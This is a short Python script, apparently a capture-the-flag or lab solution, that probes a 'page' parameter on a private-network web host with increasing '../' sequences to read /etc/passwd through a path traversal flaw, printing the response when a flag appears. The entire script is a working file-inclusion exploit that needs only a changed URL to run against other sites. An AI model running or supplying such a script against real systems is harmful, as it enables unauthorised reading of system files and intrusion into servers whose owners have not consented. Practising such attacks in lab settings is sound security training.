import requests


base_url = 'http://192.168.56.3/index.php'
target_file = '/etc/passwd'
max_depth = 10

for depth in range(1, max_depth + 1):
    path = '../' * depth + target_file.lstrip('/')
    try:
        url = f"{base_url}?page={path}"
        response = requests.get(url)

        if 'flag' in response.text:
            print(f"\nFound a Flag at {url}.")
            print(response.text)
            break
        print(f"Testing path: {url}. Flag not found.")
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")